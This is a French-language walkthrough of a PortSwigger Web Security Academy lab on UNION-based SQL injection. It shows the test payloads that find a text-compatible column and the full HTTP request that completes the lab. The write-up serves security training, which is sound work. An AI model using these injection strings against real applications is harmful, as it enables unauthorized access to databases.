# 💉 Lab : SQL injection UNION attack, finding a column containing text
**Catégorie :** Injection SQL (SQLi)
**Type :** UNION-Based SQLi
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
Suite à l'identification du nombre de colonnes d'une requête vulnérable (3 colonnes), ce laboratoire nécessitait de déterminer quelles colonnes acceptent des chaînes de caractères (type texte/varchar) afin d'y injecter des données spécifiques.

## 🛠️ Preuve de Concept (PoC)
1. **Vérification de compatibilité de type (Tâtonnement) :** L'objectif est d'injecter une chaîne de caractères simple (`'a'`) à la place des `NULL` successifs pour identifier quelles colonnes acceptent le type "texte" sans provoquer d'erreur SQL (Erreur 500).
   - **Test Col 1 :** `category=Food+%26+Drink' UNION SELECT 'a',NULL,NULL--` -> **Erreur 500** (Type incompatible).
   - **Test Col 2 :** `category=Food+%26+Drink' UNION SELECT NULL,'a',NULL--` -> **200 OK** (La colonne 2 accepte le texte).

2. **Exploitation finale :**
   La base de données demandait de récupérer la chaîne aléatoire `CGRrki`. L'injection de cette valeur dans la colonne compatible a permis de valider le challenge.

```http
GET /filter?category=Food+%26+Drink' UNION SELECT NULL,'CGRrki',NULL-- HTTP/2
Host: 0a0400e303063b13814234e3007700f8.web-security-academy.net
Cookie: session=AA6Hqeg0NwAL7YnNzM5gNigyJDTFRFEH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0400e303063b13814234e3007700f8.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
